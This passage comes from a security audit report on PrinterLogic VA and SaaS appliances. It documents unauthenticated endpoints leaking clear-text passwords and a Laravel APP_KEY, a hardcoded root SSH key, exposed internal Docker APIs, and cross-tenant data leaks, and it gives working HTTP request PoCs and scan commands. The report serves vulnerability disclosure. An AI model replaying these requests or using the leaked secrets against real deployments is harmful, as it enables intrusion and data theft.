<p>The <code>/va-api/v1/storage/secrets.env</code> API provides clear-text passwords when using the previously public <code>apiSign</code> and <code>apiTimeStamp</code> variables:</p>
<p>Leak of passwords
<img alt="" src="images/2025-vasion-report-2-leak-passwords-01.png" /></p>
<p><a href="images/2025-vasion-report-2-leak-passwords-01-full.png">Click here for full image</a></p>
<p>The <code>/va-api/v1/services</code> API also provides clear-text passwords.</p>
<p>The <code>APP_KEY</code> variable is used by Laravel. An attacker knowing this variable can get Remote Code Execution against PrinterLogic:</p>
<p>Leak of passwords
<img alt="" src="images/2025-vasion-report-2-leak-passwords-02.png" /></p>
<p><a href="images/2025-vasion-report-2-leak-passwords-02-full.png">Click here for full image</a></p>
<p>HTTP request disclosing passwords:</p>
<pre>
GET /va-api/v1/storage/secrets.env?sign=$2y$10$HfXU5jgVFNx2hr6sxK730uvZBi/qEtAmeuHd7IUxFcYmooZryG81O&timeStamp=2023-12-28%2011:32:43 HTTP/1.1
Host: gw.10.105.0.60
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------190670500540510886892839752320
Content-Length: 0
Origin: http://10.105.0.60
Connection: close
Referer: http://10.105.0.60/

HTTP/1.1 200 OK
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Cache-Control: no-cache, private
Content-Type: text/plain; charset=utf-8
Date: Thu, 28 Dec 2023 11:36:22 GMT 
Server: nginx
Connection: close
Content-Length: 3517

#########
#   This file contains configuration variables that may be customized to suit your environment.
#   Changes to values in this file are monitored for periodic updates and may not be reflected immediately in the product.
#   Most updates should propagate within several minutes, although it may take up to 30 minutes for changes to be applied.
#   Rebooting the appliance may also trigger an update.
##########
#
#   * PRINTERCLOUD_DOMAIN (required)
#   This should be the base domain used to reach your product.  For example, if your instance is reached via 
#   "printers.mycompany.com" this value would be "printers.mycompany.com"
[...]
########### VALUES
DB_DATABASE="app_pi"
<font color=red>DB_PASSWORD="xg1o6iReDLcyGIBvZMbr"</font>
DB_PORT=3306
DB_USERNAME="admin"
PRINTERCLOUD_DOMAIN="10.105.0.60"
<font color=red>SAMBA_PASSWORD="6QOjoEKpcWrEJqILbwox"</font>
</pre>

<p>HTTP request disclosing passwords:</p>
<pre>
GET /va-api/v1/services?sign=$2y$10$w..pLsnjlsP6bY43oMm/.epXaRjdSA2no7AhfpKkfTcrT4UJDM9bG&timeStamp=2023-12-29%2013:19:41 HTTP/1.1
Host: gw.10.105.0.60
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17749310539621720221197883675
Content-Length: 0
Origin: http://10.105.0.60
Connection: close
Referer: http://10.105.0.60/

HTTP/1.1 200 OK
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Cache-Control: no-cache, private
Content-Length: 684
Content-Type: application/json
Date: Fri, 29 Dec 2023 13:20:34 GMT
Server: nginx
Connection: close

[
  {
    "name": "database",
    "status": "not ready",
    "properties": {
      "database": "",
      "host": "",
      "password": "",
      "port": "",
      "ssl_ca": "false",
      "ssl_strict": "true",
      "username": ""
    }
  },
  {
    "name": "settings",
    "status": "not ready",
    "properties": {
      "auto_update": "0",
      "auto_update_schedule": "",
      "deployment_environment": "prod",
      "domain": "",
      "license": "false",
      "piv_cac": "false",
      "samba_pass": "",
      "ssl_cert": "false",
      "ssl_key": "false",
      "ssl_terminated": "0"
    }
  },
  {
    "name": "migration",
    "status": "not ready",
    "properties": {
<font color=red>      "app_key": "YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf",</font>
      "database": "",
      "host": "",
      "password": "",
      "port": "",
      "progress": "pending",
      "username": ""
    }
  },
  {
    "name": "storage",
    "status": "ready",
    "properties": {
      "type": "vdisk",
      "vdisk_status": "ready"
    }
  }
]
</pre>

<p>Using a shell inside the targeted PrinterLogic instance, we can confirm that the <code>APP_KEY</code> is valid and is currently being used.</p>
<p>Analysis of the PrinterLogic VA version:</p>
<pre><code>root@printerlogic:/home/debug# for i in $(docker ps | awk '{ print $1 }'); do echo $(docker ps | grep $i | awk '{ print $2 }'); docker exec -it $i env | grep APP_KEY;done
ID
printerlogic/ofn:1.134.7
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/oncp-hold:v1.0.171
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/client:25.1.0.652
printerlogic/va-cdn:0.0.1090
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/sched:1.0.20
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/oncp-ofn:v1.0.16
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/prs:1.0.7
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/cat:1.0.72
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/authn:1.16.0
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/tree:1.0.10
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/printer:v1.1.86
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/pi:5.0.8085-p2
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/client-socket-server:1.0.7
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/identity:v1.0.425
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
APP_KEY_USERS=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/pi:5.0.8085-p2
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/scim:1.0.66
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/gw-api:1.0.61
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/eb:0.0.8
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/tms:v1.0.57
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/va-api:1.1.211
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/adt:v1.0.161
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/users:5.207.3
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/users:5.207.3
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/pi:5.0.8085-p2
APP_KEY=YqFUuJ0wt610pkALBSWBWP3XBjG3mxmf
printerlogic/client-api:1.0.28
[...]
</code></pre>
<p>An attacker can get Remote Code Execution in a PrinterLogic instance.</p>
<h2>Vulnerabilities affecting PrinterLogic SaaS / PrinterLogic VA</h2>
<h2>Identification of the solution</h2>
<p>The audited PrinterLogic version is 22.0.893 from December 2023.</p>
<p>The audited host version is 1.0.730.</p>
<p>This PrinterLogic version has been retrieved from https://help.printerlogic.com/va/1-Printerlogic/Release_Notes/VA_Latest_Host_Builds.htm (OpenBuild 22.0.893: December 1st, 2023).</p>
<p>Checksum of the audited version:</p>
<pre><code>b06c9938b8ec5fd47a41fb7188d8e50fd9bac727a2ac0e84e4719524a124f744  printerinstaller-22.0.893.ova
</code></pre>
<p>The solutions use several Docker instances - all the instances have been made up to date, as shown below:</p>
<p>Printerlogic VA version 
<img alt="" src="images/2025-vasion-report-2-local-version-01.png" /></p>
<p>Printerlogic SaaS version on [redacted].printerlogic10.com 
<img alt="" src="images/2025-vasion-report-2-saas-version.png" /></p>
<p><a id="va-undocumented-hardcoded-ssh-key"></a></p>
<h2>Details - Undocumented hardcoded SSH key</h2>
<p>The appliance contains an undocumented user (<code>printerlogic</code>) with a hardcoded SSH key.</p>
<p>Public SSH key for the printerlogic user:</p>
<pre><code>root@printerlogic:/home/printerlogic# pwd 
/home/printerlogic
root@printerlogic:/home/printerlogic# find .
.
./.profile
./.ssh
./.ssh/authorized_keys
./.bashrc
./.bash_logout
root@printerlogic:/home/printerlogic# cat ./.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCw+sKOEvtwR/sOlzWKmZkiRfoZs9Atdm5EVIdSADiOGstscYFmXB12a6BlHptBziq2Z9NUHoRfAS923Mgk9KdGhK/0qIheyLuFks1uLve2MiIkwO4hb72AtwN8ceecJSBu6FvOq0LMEMl1PX3sNt1Yu+CFIAUfr47P6ja2y1qmW9Mj9pGGLafXFuP49D1bZ5wnZ/XVusHHyHqOOA4D1IMAxP7YqhbM6FekE9oiQqX3r//ci5YtG+yzbCcLSBjIOxVpRDFX9/0AKYzeC5DiKkQ8if+xyND0cS1kI/D5NQ5Q/NIttoQRMETv8jXDhycUrZPEOEaP4ODWj0wRD/rtTwkV12Kf9i0hxmKxh2TH7LXBEjlq6xo7w9GLSapyV2AREP94NoZjL7GAPIdz3JneiyOvb/pcCR8xjHijlr8WXk9M0ZK2Ma29KCAl4ZLPC3z43psJyYLDXmJOrIsJNE4bnBaBuWADZPKYPC54WzqpTjmp1wObQT+Jbecf/GYj0rqj2GSqu2Ij8fBKS4rJ/2aee3afLwbsYVqz/g0x4qaOZo+X6DcrvLErbgERs471k80QMWOhLbOCYtIAEcZI2gnhD3ZMZXc790sp1PC2WXD2dZFEXBqLTMIKdaIL2Nc/XCt6TYZpcfvt49S6p3KiTtN9BrfPhyINof8DbzHL2d4dL0q6/Q== Virtual Appliance Development Key 
root@printerlogic:/home/printerlogic#
</code></pre>
<p>This account is undocumented. Futhermore, it has root privileges with sudo, without the password being requested:</p>
<pre><code>root@printerlogic:~# grep printerlogic /etc/group
printerlogic_ssh:x:1001:printerlogic
printerlogic:x:1002:
root@printerlogic:~# grep printerlogic /etc/sudoers
%printerlogic_ssh ALL=(ALL) NOPASSWD: ALL
root@printerlogic:~#
</code></pre>
<p>An attacker who has the corresponding SSH key will get root access to the appliance.</p>
<p><a id="va-exposed-docker-instances"></a></p>
<h2>Details - Internal Docker instances exposed on the LAN and the Internet</h2>
<p>It was observed that some Docker instances are exposed on the network and the Internet through the gw Docker instance.</p>
<p>Since these instances are directly reachable from the Internet without ACL and without authentication, the resulting attack surface is enormous.</p>
<p>For example, the <code>http://gw.10.105.0.60/meta</code> URL in the VA version will list the reachable Docker instances.</p>
<p>In the SaaS version, we can list reachable Docker instance by visiting <code>https://gw.app.printercloud10.com/meta</code>. These Docker instances are reachable through <code>https://gw.app.printercloud10.com/[docker-name]/[apis]</code>.</p>
<p>https://gw.app.printercloud10.com/meta:
<img alt="" src="images/2025-vasion-report-2-exposure-docker-instances.png" /></p>
<p><a href="images/2025-vasion-report-2-exposure-docker-instances-full.png">Click here for full image</a></p>
<p>PoC:</p>
<pre><code>GET /meta HTTP/2
Host: gw.app.printercloud10.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

{
  "authn": {
    "meta": {
      "name": "Authentication Microservice",
      "version": "1.21.6",
      "releaseDate": "2024-01-03T02:30:59Z"
    }
  },
  "br": {
    "meta": {
      "name": "Badge Reader Microservice",
      "version": "1.0.78",
      "releaseDate": "2023-03-13T18:57:29Z"
    }
  },
  "cat": null,
  "cl": null,
  "cpp-ui": {
    "meta": {
      "name": "Control Panel Platform UI",
      "version": "1.153.102",
      "releaseDate": "2023-12-12T19:20:04Z"
    }
  },
  "ebc": {
    "meta": {
      "name": "External Badge Connector Microservice",
      "version": "1.0.34",
      "releaseDate": "2021-03-31T21:10:36Z"
    }
  },
  "gw": {
    "meta": {
      "name": "API Gateway Microservice",
      "version": "1.308.3",
      "releaseDate": "2023-09-08T21:37:44Z"
    }
  },
  "identity": {
    "meta": {
      "name": "Identity Microservice",
      "version": "v1.0.530",
      "releaseDate": ""
    }
  },
  "idpi": {
    "meta": {
      "name": "IDP Integrations Microservice",
      "version": "1.0.8",
      "releaseDate": "2023-03-21T22:07:50Z"
    }
  },
  "oidc": null,
  "pq": {
    "meta": {
      "name": "Print Queue Microservice",
      "version": "5.0.195",
      "releaseDate": "2023-12-22T00:10:15Z"
    }
  },
  "printerinstaller": {
    "meta": {
      "name": "PrinterInstaller",
      "instanceUrl": "http://pi.printercloud:8042",
      "siteId": "printerlogic",
      "tenantId": "107",
      "apiUrl": "https://printerlogic.printercloud10.com",
      "agentUrl": "https://agent-api.app.printercloud10.com",
      "version": "5.0.8220",
      "releaseDate": "2023-12-26T22:52:53Z"
[...]
</code></pre>
<p>An attacker can interact with internal Docker instances.</p>
<p><a id="va-exposed-upload-docker-instance"></a></p>
<h2>Details - Docker instance used to upload clients reachable from the Internet and the LAN</h2>
<p>It was observed that the Docker instance used to upload the Windows/MacOS/Linux clients is reachable from the LAN (for PrinterLogic VA) and from the Internet (for the SaaS version).</p>
<p>When analyzing the API of <code>gw.app.printercloud10.com</code>, it appears that the Windows/Mac clients are managed by the Docker instance <code>printerlogic/agent-api</code>:</p>
<p><code>https://gw.app.printercloud10.com/meta</code>:</p>
<pre><code>GET /meta HTTP/2
Host: gw.app.printercloud10.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

{
[...]
  "printerinstaller": {
    "meta": {
      "name": "PrinterInstaller",
      "instanceUrl": "http://pi.printercloud:8042",
      "siteId": "printerlogic",
      "tenantId": "107",
      "apiUrl": "https://printerlogic.printercloud10.com",
      "agentUrl": "https://agent-api.app.printercloud10.com",
      "version": "5.0.8220",
      "releaseDate": "2023-12-26T22:52:53Z"
    }
  },
[...]
}
</code></pre>
<p>This docker instance also runs inside the VA version:</p>
<pre><code>root@printerlogic:/home/debug# docker ps|grep agent
e540505060c2   printerlogic/agent-api:v1.0.169           "/opt/entrypoint.sh "   2 hours ago      Up 2 hours (healthy)
</code></pre>
<p>It appears that this Docker instance is used to upload new versions of clients.</p>
<p>Access to <a href="https://agent-api.app.printercloud10.com">https://agent-api.app.printercloud10.com</a>:</p>
<pre><code>kali% curl -kv https://agent-api.app.printercloud10.com/
*   Trying 13.55.51.178:443...
* Connected to agent-api.app.printercloud10.com (13.55.51.178) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=printercloud10.com
*  start date: Dec 21 00:00:00 2023 GMT
*  expire date: Jan 18 23:59:59 2025 GMT
*  issuer: C=US; O=Amazon; CN=Amazon RSA 2048 M02
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://agent-api.app.printercloud10.com/
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: agent-api.app.printercloud10.com]
* [HTTP/2] [1] [:path: /]
* [HTTP/2] [1] [user-agent: curl/8.4.0]
* [HTTP/2] [1] [accept: */*]
&gt; GET / HTTP/2
&gt; Host: agent-api.app.printercloud10.com
&gt; User-Agent: curl/8.4.0
&gt; Accept: */*
&gt; 
&lt; HTTP/2 404 
&lt; date: Wed, 03 Jan 2024 11:40:53 GMT
&lt; content-type: text/plain
&lt; content-length: 18
&lt; 
* Connection #0 to host agent-api.app.printercloud10.com left intact
404 page not found
kali%
</code></pre>
<p>The <code>/opt/api</code> server running inside the <code>printerlogic/agent-api</code> Docker instance has the same behavior.</p>
<p><code>/opt/api</code> program running inside the <code>printerlogic/agent-api</code> Docker instance:</p>
<pre><code>root@printerlogic:/home/debug# docker ps | grep agent-api
e540505060c2   printerlogic/agent-api:v1.0.169           "/opt/entrypoint.sh "   3 hours ago          Up 3 hours (healthy)                                                                                     printercloud_agent-api.lk6nfgkbi705w15yp8iqshxpz.h05rvwhql4l45y0dykva06t9e
root@printerlogic:/home/debug# docker exec -it e540505060c2 ps -a
PID   USER     TIME  COMMAND
    1 root      1:33 /opt/api
 6762 root      0:00 ps -a
root@printerlogic:/home/debug# docker inspect --format "{{ .State.Pid }}" e540505060c2
9359
root@printerlogic:/home/debug# nsenter -n -t 9359
root@printerlogic:/home/debug# curl -kv http://127.0.0.1/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; Host: 127.0.0.1
&gt; User-Agent: curl/7.81.0
&gt; Accept: */*
&gt; 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 404 Not Found
&lt; Content-Type: text/plain
&lt; Date: Wed, 03 Jan 2024 11:42:59 GMT
&lt; Content-Length: 18
&lt; 
* Connection #0 to host 127.0.0.1 left intact
404 page not found
root@printerlogic:/home/debug#
</code></pre>
<p>Due to the lack of time spent for analysis, considering the size of the binary and the complexity of the generated pseudo-code, the API endpoints were not identified but it is very likely that this program supports uploading new clients.
The program contains ~ 26,000 functions and since the program uses the Go Gin web framework, it is very hard to track cross-references to interesting functions. This analysis was too time-consuming and was not done in-depth.</p>
<p>Decompilation of /opt/api
<img alt="" src="images/2025-vasion-report-2-ida-opt-api.png" /></p>
<p>An attacker may be able to upload Windows and MacOS clients.</p>
<p>An attacker who can spend enough time will do reverse engineering against this program to find vulnerabilities.</p>
<p><a id="va-api-leak"></a></p>
<h2>Details - Unauthenticated API leaking group information</h2>
<p>It was observed that the <code>/api-gateway/identity/search-groups</code> API is insecure - this API will display information about group without authentication.</p>
<p>An attacker can retrieve information for any SaaS customer by specifying a <code>siteID</code> (extracted from the <code>Host</code> HTTP header in the HTTP request). For example, for [redacted]:</p>
<p>HTTP request
<img alt="" src="images/2025-vasion-report-2-api-no-auth.png" /></p>
<p><a href="images/2025-vasion-report-2-api-no-auth-full.png">Click here for full image</a></p>
<p>PoC - the SiteID can be adapted to any target by modifying the Host header:</p>
<pre><code>POST /api-gateway/identity/search-groups HTTP/2
Host: [redacted-target-tenant].printercloud10.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 44


{"sourceServiceType":"identity","name":""}
</code></pre>
<p>And the reply will provide information about the configured groups:</p>
<pre><code>HTTP/2 200 OK
Date: Fri, 22 Dec 2023 07:44:07 GMT 
Content-Type: application/json
Cache-Control: no-cache, private
Content-Security-Policy: frame-ancestors 'self'
Server: nginx
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block


[
  {
    "id": "[redacted]",
    "sourceServiceType": "azuread",
    "sourceService": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "name": "[redacted]",
    "description": "",
    "email": "",
    "domain": "",
    "siteId": "[redacted]",
    "sourceId": "[redacted]",
    "distinguishedName": "",
    "createdAt": "2023-03-20 01:18:16",
    "updatedAt": "2023-03-20 01:18:16",
    "users": [],
    "tenantId": 9999,
    "detach_users": []
  },
  {
    "id": "[redacted]",
    "sourceServiceType": "azuread",
    "sourceService": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "name": "[redacted]",
    "description": "",
    "email": "",
    "domain": "",
    "siteId": "[redacted]",
    "sourceId": "[redacted]",
    "distinguishedName": "",
    "createdAt": "2023-06-06 01:04:44",
    "updatedAt": "2023-06-06 01:04:44",
    "users": [],
    "tenantId": 9999,
    "detach_users": []
  },
  [...]
  {
    "id": "[redacted]",
    "sourceServiceType": "azuread",
    "sourceService": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
    "name": "[redacted]",
    "description": "",
    "email": "",
    "domain": "",
    "siteId": "[redacted]",
    "sourceId": "[redacted]",
    "distinguishedName": "",
    "createdAt": "2023-03-20 01:18:17",
    "updatedAt": "2023-03-20 01:18:17",
    "users": [],
    "tenantId": 9999,
    "detach_users": []
  },
  [...]
</code></pre>
<p>The GET request also works:</p>
<pre><code>kali% curl https://[redacted].printercloud10.com/api-gateway/identity/search-groups
[{"id": "[redacted]","sourceServiceType": "azuread","sourceService": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa","name": "[redacted]","description": "","email": "","domain": "","siteId": "[redacted]","sourceId": "[redacted]","distinguishedName": "","createdAt": "2023-03-20 01:18:16","updatedAt": "2023-03-20 01:18:16","users": [],"tenantId": 9999,"detach_users": []},id": "[redacted]","sourceServiceType": "azuread","sourceService": "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa","name": "[redacted]",
</code></pre>
<p>A threat actor can retrieve information for any siteID.</p>
<p><a id="va-firefox-plugin-over-http"></a></p>
<h2>Details - Installation of the Firefox plugin over HTTP</h2>
<p>It was observed that the installation of the Firefox plugin is done insecurely over HTTP:</p>
<p>https://printerlogic.com/browser-extension/
<img alt="" src="images/2025-vasion-report-2-firefix-http-02.png" /></p>
<p><a href="images/2025-vasion-report-2-firefix-http-02-full.png">Click here for full image</a></p>
<p>When analyzing the request, we can confirm that the XPI file is stored insecurely, over HTTP at <code>http://downloads.printerlogic.com/printerlogic_extension-1.0.5.10-an%2Bfx-windows.xpi</code>:</p>
<p>HTTP request
<img alt="" src="images/2025-vasion-report-2-firefix-http-01.png" /></p>
<p><a href="images/2025-vasion-report-2-firefix-http-01-full.png">Click here for full image</a></p>
<p>An attacker can MITM and inject malicious Firefox extensions.</p>
<p><a id="va-auth-bypass"></a></p>
<h2>Details - Authentication Bypass - Docker instances reachable without authentication</h2>
<p>It was observed that the Docker instances are freely reachable over the network due to insecure firewall rules. An attacker can directly interact with internal APIs and bypass any authentication mechanism.</p>
<p>Adding routes, 10.105.0.60 is the PrinterLogic instance:</p>
<pre><code>kali# route add -net 172.17.0.0/24 gw 10.105.0.60
kali# route add -net 172.17.130.0/24 gw 10.105.0.60
kali# route add -net 172.17.1.0/24 gw 10.105.0.60
</code></pre>
<p>Scanning IPs to detect Docker instances:</p>
<pre><code>kali$ sudo nmap -sT -v -n -p80 -oG printerlogic-va.grep 172.17.0.0/23
[...]
Nmap scan report for 172.17.0.185
Host is up (0.0020s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.17.0.186
Host is up (0.0013s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap scan report for 172.17.1.1
Host is up (0.00081s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.17.1.129
Host is up (0.00087s latency).

PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 512 IP addresses (62 hosts up) scanned in 6.63 seconds
           Raw packets sent: 3666 (138.648KB) | Rcvd: 89073 (21.482MB)

kali% grep open printerlogic-va.grep
Host: 172.17.0.1 ()     Ports: 80/open/tcp//http///
Host: 172.17.0.129 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.130 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.135 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.137 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.138 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.139 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.140 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.141 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.142 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.144 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.145 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.146 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.147 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.149 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.150 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.151 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.152 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.153 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.155 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.157 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.158 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.159 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.160 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.161 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.163 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.164 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.165 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.166 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.167 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.170 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.172 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.173 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.175 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.176 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.177 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.178 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.180 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.181 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.182 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.184 ()   Ports: 80/open/tcp//http///
Host: 172.17.0.185 ()   Ports: 80/open/tcp//http///
Host: 172.17.1.1 ()     Ports: 80/open/tcp//http///
Host: 172.17.1.129 ()   Ports: 80/open/tcp//http///
</code></pre>
<p>It is then possible to interact with instances without authentication.</p>
<p>Interacting with the scim Docker instance:</p>
<pre><code>kali% curl -kv http://172.17.0.158/ -H "X-Site-ID: "
*   Trying 172.17.0.158:80...
* Connected to 172.17.0.158 (172.17.0.158) port 80
&gt; GET / HTTP/1.1
&gt; Host: 172.17.0.158
&gt; User-Agent: curl/8.4.0
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Server: nginx
&lt; Content-Type: text/html; charset=UTF-8
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; Cache-Control: no-cache, private
&lt; Date: Fri, 22 Dec 2023 08:19:40 GMT
&lt; Set-Cookie: XSRF-TOKEN=eyJpdiI6InVMSlNlNkk3aTRaQ1FwaCsrd0wrREE9PSIsInZhbHVlIjoiWFZmZFc0cTR6QVNqYVVSUldmSnEwdVhpdFNkK05KRGxGdUdSTThEdURDelp0alwvdXA1U2pIVFwvNkwxcXlyUUoxIiwibWFjIjoiZDU0MzQ5ZDJlZDQxNWRjMTdlM2FmNjQxMjAwNGE1Y2E1NDIyMzU3MTQ1M2U3OTA1MmY4ZWIxZDQ3YTkzNWE0NCJ9; expires=Fri, 22-Dec-2023 10:19:40 GMT; Max-Age=7200; path=/
&lt; 
* Connection #0 to host 172.17.0.158 left intact
scim
</code></pre>
<p>Regarding the SaaS version, the vulnerability depends on the implementation inside the AWS infrastructure. Due to the lack of defense in depth, there is no reason to believe the SaaS version is not vulnerable.</p>
<p>An attacker can bypass authentication and interact with internal APIs.  </p>
<p>The entire authentication mechanism is bypassed as APIs are exposed without authentication.</p>
<p>One of the authentication mechanisms is based on the <code>X-Site-ID</code> HTTP header, corresponding to the installation ID - this can be bypassed by adding HTTP headers.</p>
<p>It is recommended to review the design of the solution.</p>
<p><a id="va-add-partial-admin-without-auth"></a></p>
<h2>Details - Addition of partial-admin users without authentication</h2>
<p>It was observed that an attacker can remotely add users without authentication on PrinterLogic. Then the user can log into the admin interface and receive an admin cookie.</p>
<p>An attacker can send a HTTP request to <code>/admin/identity-idp-search</code> without session cookies. The attacker receives 2 cookies (<code>XSRF-TOKEN</code>, <code>laravel_session</code>) and 1 CSRF token in the JSON body:</p>
<p>HTTP request to <code>/admin/identity-idp-search</code> without authentication:
<img alt="" src="images/2025-vasion-report-2-add-admin-user-01.png" /></p>
<p><a href="images/2025-vasion-report-2-add-admin-user-01-full.png">Click here for full image</a></p>
